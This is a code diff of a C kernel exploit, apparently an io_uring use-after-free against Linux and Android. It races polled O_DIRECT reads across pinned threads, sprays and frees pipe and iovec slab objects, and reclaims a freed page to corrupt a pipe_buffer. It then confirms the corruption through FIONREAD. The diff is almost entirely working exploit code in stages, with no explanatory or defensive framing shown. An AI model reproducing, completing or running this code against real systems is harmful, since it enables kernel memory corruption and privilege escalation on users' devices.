@@ -11,6 +11,9 @@
 #include <fcntl.h>
 #include <sched.h>
 #include <string.h>
+#include <assert.h>
+#include <sys/uio.h>
+#include <sys/ioctl.h>
 
 typedef uint64_t u64;
 typedef int64_t i64;
@@ -495,7 +498,9 @@ void init_barrier(pthread_barrier_t *barrier, u32 count) {
 typedef struct {
   IoUring io_uring;
   int read_poll_fd;
-  pthread_barrier_t barrier;
+  pthread_t trigger_thread;
+  pthread_barrier_t setup_barrier;
+  pthread_barrier_t trigger_barrier;
   char *buf;
 } Context;
 
@@ -505,9 +510,9 @@ void *do_poll(void *arg) {
 
   io_uring_enter_poll(&context->io_uring, 1);
 
-  // for (;;) {
-  //   sleep(100);
-  // }
+  for (;;) {
+    sleep(100);
+  }
 
   return NULL;
 }
@@ -518,27 +523,99 @@ void poll_event(Context *context) {
   pthread_join(thread, NULL);
 }
 
-void trigger_bug(Context *context) {
-  struct io_uring_sqe *sqe = &context->io_uring.sq_entries[0];
+// void trigger_bug(Context *context) {
+//   struct io_uring_sqe *sqe = &context->io_uring.sq_entries[0];
+//   memset(sqe, 0, sizeof(struct io_uring_sqe));
+//   sqe->opcode = IORING_OP_READ;
+//   sqe->fd = context->read_poll_fd;
+//   sqe->off = 0;
+//   sqe->addr = (usize) context->buf;
+//   sqe->len = 4096;
+//   sqe->user_data = 0x6969;
+
+//   io_uring_submit_sqe(&context->io_uring, sqe);
+//   io_uring_enter_submit(&context->io_uring, 1);
+
+//   poll_event(context);
+// }
+
+Context context = { 0 };
+
+void *trigger_thread(void *arg) {
+  pin_to_cpu(0);
+  pthread_barrier_wait(&context.setup_barrier);
+
+  // submit 1 random read, to give our own task a valid current->io_uring
+  // otherwise it is null, since there is a bug in kernel poll with iopoll does not set this up
+  struct io_uring_sqe *sqe = &context.io_uring.sq_entries[0];
   memset(sqe, 0, sizeof(struct io_uring_sqe));
   sqe->opcode = IORING_OP_READ;
-  sqe->fd = context->read_poll_fd;
+  sqe->fd = context.read_poll_fd;
   sqe->off = 0;
-  sqe->addr = (usize) context->buf;
+  sqe->addr = (usize) context.buf;
+  sqe->len = 4096;
+  sqe->user_data = 0x69696969;
+
+  io_uring_submit_sqe(&context.io_uring, sqe);
+  io_uring_enter_submit(&context.io_uring, 1);
+  io_uring_enter_poll(&context.io_uring, 1);
+
+  struct io_uring_cqe *cqes = io_uring_get_cqe(&context.io_uring);
+  printf("dummy completion:\nret value: %d\nuser cookie: %lx\n", cqes[0].res, cqes[0].user_data);
+
+  pthread_barrier_wait(&context.trigger_barrier);
+
+  io_uring_enter_poll(&context.io_uring, 1);
+
+  return NULL;
+}
+
+void setup_bug() {
+  init_barrier(&context.setup_barrier, 2);
+  init_barrier(&context.trigger_barrier, 2);
+  // context.read_poll_fd = SYSCHK(open("/apex/com.android.runtime/lib64/bionic/libc.so", O_RDONLY | O_DIRECT | O_NONBLOCK));
+  context.read_poll_fd = SYSCHK(open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY | O_DIRECT | O_NONBLOCK));
+  context.buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+
+  pthread_create(&context.trigger_thread, NULL, trigger_thread, NULL);
+
+  context.io_uring = io_uring_setup();
+
+  // have other thread do 1 dummy poll
+  pthread_barrier_wait(&context.setup_barrier);
+
+  struct io_uring_sqe *sqe = &context.io_uring.sq_entries[0];
+  memset(sqe, 0, sizeof(struct io_uring_sqe));
+  sqe->opcode = IORING_OP_READ;
+  sqe->fd = context.read_poll_fd;
+  sqe->off = 0;
+  sqe->addr = (usize) context.buf;
   sqe->len = 4096;
   sqe->user_data = 0x6969;
 
-  io_uring_submit_sqe(&context->io_uring, sqe);
-  io_uring_enter_submit(&context->io_uring, 1);
+  io_uring_submit_sqe(&context.io_uring, sqe);
+  io_uring_enter_submit(&context.io_uring, 1);
+}
 
-  poll_event(context);
+void trigger_bug() {
+  // io_uring_enter_poll(&context.io_uring, 1);
+  pthread_barrier_wait(&context.trigger_barrier);
+  pthread_join(context.trigger_thread, NULL);
 }
 
 int sync_pipes[2] = { 0 };
 char global_buffer[0x4000] = { 0 };
 
+#define MAX_PIPE_NUM 0x400
+#define PIPE_PAGE_NUM 0x600
+#define FIRST_PIPE_SPRAY 0x180
+#define MAX_256_PIPE 0x400
+
+int pipes[MAX_PIPE_NUM][2] = { 0 };
+int pipe_pages[PIPE_PAGE_NUM][2] = { 0 };
+
 void *do_iov_spray(void *idx) {
-  pin_on_cpu(CPU);
+  pin_to_cpu(0);
 
   unsigned long pipe_idx = (unsigned long)(idx);
   char data[0x100] = {};
@@ -588,18 +665,18 @@ spray_256:
   }
 }
 
-#define MAX_PIPE_NUM 0x400
-#define PIPE_PAGE_NUM 0x600
-#define FIRST_PIPE_SPRAY 0x180
-
-int pipes[MAX_PIPE_NUM][2];
-
-void exploit(Context *context) {
+void exploit() {
   int exp_pipes[4] = { 0 };
+
+  // puts("trigger");
+  // setup_bug();
+  // trigger_bug();
+  // return;
 
   // char global_buffer[0x100] = { 0 };
 
   for (int i = 0; i < MAX_PIPE_NUM; i++) {
+    printf("%d\n", i);
     SYSCHK(pipe(pipes[i]));
     // prefault the page
     CHECK(fcntl(pipes[i][1], F_SETPIPE_SZ, 0x1000), 0x1000);
@@ -651,6 +728,61 @@ void exploit(Context *context) {
   }
 
   printf("[*] STAGE 2: trigger the bug\n");
+  setup_bug();
+
+  // allocate a pipe buffer for this
+  CHECK(fcntl(exp_pipes[1], F_SETPIPE_SZ, 0x4000), 0x4000);
+  // fill the slab with other iovs
+  for (int i = FIRST_PIPE_SPRAY; i < MAX_256_PIPE; i++) {
+    // usleep(10);
+    write(pipes[i][1], "S", 1);
+  }
+
+  // sync with the spray
+  count = MAX_256_PIPE - FIRST_PIPE_SPRAY;
+  while (count) {
+    usleep(10);
+    int res = read(sync_pipes[0], global_buffer + 0x300, count);
+    // printf("read res : %d\n", res);
+    count -= res;
+  }
+
+  trigger_bug();
+  // sleep for a while making sure the memory is freed
+  usleep(1000 * 1000);
+
+  printf("[*] STAGE 3: free the cache\n");
+  // now free the iov
+  for (int i = MAX_256_PIPE - 1; i >= 0; i--) {
+    usleep(10);
+    write(pipes[i][1], global_buffer + 0x200, 256 / 16);
+  }
+
+  // sync with the free
+  count = MAX_256_PIPE;
+  while (count) {
+    usleep(10);
+    int res = read(sync_pipes[0], global_buffer + 0x300, count);
+    // printf("read res : %d\n", res);
+    count -= res;
+  }
+
+  printf("[*] STAGE 4: reclaim the page\n");
+  memset(global_buffer, 'A', 0x1000);
+  for (int i = 0; i < PIPE_PAGE_NUM; i++) {
+    write(pipe_pages[i][1], global_buffer, 0x1000);
+  }
+
+  int size = 0;
+  // now check pipe_buffer
+  ioctl(exp_pipes[1], FIONREAD, &size);
+  printf("FIONREAD pipe 1 is %x\n", size);
+  if (size != 0x41414141) {
+    printf("failed, please retry\n");
+    fflush(stdout);
+    sleep(3);
+    return;
+  }
 }
 
 int main() {
@@ -658,13 +790,13 @@ int main() {
 
   pin_to_cpu(0);
 
-  Context context = {
-    .io_uring = io_uring_setup(),
-    .read_poll_fd = SYSCHK(open("/apex/com.android.runtime/lib64/bionic/libc.so", O_RDONLY | O_DIRECT | O_NONBLOCK)),
-    .buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0),
-  };
+  // Context context = {
+  //   .io_uring = io_uring_setup(),
+  //   .read_poll_fd = SYSCHK(open("/apex/com.android.runtime/lib64/bionic/libc.so", O_RDONLY | O_DIRECT | O_NONBLOCK)),
+  //   .buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0),
+  // };
 
-  exploit(&context);
+  exploit();
 
   // trigger_bug(&context);
 
